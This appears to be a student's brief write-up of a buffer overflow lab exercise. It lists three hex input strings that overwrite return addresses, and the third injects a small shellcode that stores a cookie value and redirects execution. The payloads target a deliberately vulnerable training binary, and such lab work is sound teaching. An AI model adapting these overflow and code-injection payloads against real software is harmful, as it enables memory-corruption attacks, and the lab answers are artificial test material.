This was very similar to Lab 2 but I had to use buffer overflows to cause the code to jump to different sections. Here were my inputs.

1) 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 
BB BB BB BB CC CC CC CC DD DD DD DD BB BB BB BB CC CC CC CC 70 10 40 00 00 00 00 00 00 00 00 00 00 00 00 00 d1 44 83 19 6f 1a a8 58

2) 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 BB BB BB BB CC CC CC CC DD DD DD DD BB BB BB BB CC CC CC CC c0 10 40 00

3) 48 b8 d1 44 83 19 6f 1a a8 58 48 89 04 25 08 23 60 00 68 20 10 40 00 c3 61 61 61 61 61 61 61 61 61 61 61 61 BB BB BB BB CC CC CC CC DD DD DD DD BB BB BB BB CC CC CC CC 20 b5 ff ff ff 7f

